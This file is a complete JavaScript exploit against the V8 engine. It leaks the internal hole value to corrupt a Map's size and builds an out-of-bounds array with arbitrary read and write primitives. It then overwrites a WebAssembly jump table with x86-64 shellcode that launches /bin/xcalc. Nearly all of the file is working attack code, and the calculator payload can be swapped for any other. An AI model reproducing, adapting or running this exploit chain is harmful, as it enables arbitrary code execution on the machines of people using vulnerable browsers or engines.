let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert integer to hexadecimal string
function hex(i) {
    return `0x${i.toString(16)}`;
}


function leak_hole() {
    try {
        JSON.stringify(new Array(0x80).fill(new Array(0x80).fill(new Array(0x80).fill(new Array(0x40)))));
    } catch (e) {
        return e;
    }
}
console.log("[+] Leaking hole...");
const the = { hole: leak_hole() };


let map;
let oob_arr;
let tmp_obj = {};
let obj_arr;
let typed_arr;

(function layout() {
    map = new Map();
    map.set(1, 1); // map.size == 1
    map.set(2, 2); // map.size == 2
    map.delete(2); // map.size == 1
    map.delete(the.hole); // map.size == 0
    map.delete(1); // map.size == -1

    oob_arr = [1.1];
    let dummy = {};
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

console.log(`[+] map.size == ${map.size}`); // expected: -1
console.assert(map.size == -1);

// generate oob array
map.set(22, -1); // extend hash table of `map`
map.set(0x1006, 0); // overwrite length of `oob_arr`
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`); // expected: 0x1006


// get v8 base
let v8_base = ftoi(oob_arr[25]) & 0xffffffff00000000n; // external_pointer of `typed_arr`
console.log(`[+] v8_base == ${hex(v8_base)}`);

// get (compressed) address of `obj` in sandbox
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[7]) >> 32n;
}

// read 8-byte from `addr` in sandbox
function read8(addr) {
    oob_arr[25] = itof(addr); // external_pointer of `typed_arr`
    oob_arr[26] = itof(ftoi(oob_arr[26]) & 0xffffffff00000000n); // base_pointer of `typed_arr`
    return typed_arr[0];
}

// write 8-byte `value` to `addr` in sandbox
function write8(addr, value) {
    oob_arr[25] = itof(addr); // external_pointer of `typed_arr`
    oob_arr[26] = itof(ftoi(oob_arr[26]) & 0xffffffff00000000n); // base_pointer of `typed_arr`
    typed_arr[0] = value;
}


// generate wasm module
let wasm_src = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]); // output of wasm.py
let wasm_module = new WebAssembly.Module(wasm_src);

// get address of jump table
let wasm_instance = new WebAssembly.Instance(wasm_module);
let wasm_instance_addr = v8_base + addrof(wasm_instance) - 1n;
// console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let jump_table_start = read8(wasm_instance_addr + 0x60n);
console.log(`[+] jump_table_start == ${hex(jump_table_start)}`);

// execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
let shellcode = [0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5]; // output of shellcode.py

// overwrite backing store of arraybuffer with address of jump table
let buf = new ArrayBuffer(shellcode.length);
let buf_addr = v8_base + addrof(buf) - 1n;
// console.log(`[+] buf_addr == ${hex(buf_addr)}`);
write8(buf_addr + 0x1cn, jump_table_start);

// overwrite jump table with shellcode
console.log("[+] Writing shellcode...");
let view = new DataView(buf);
for (let i = 0; i < shellcode.length; i++) {
    view.setUint8(i, shellcode[i]);
}

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
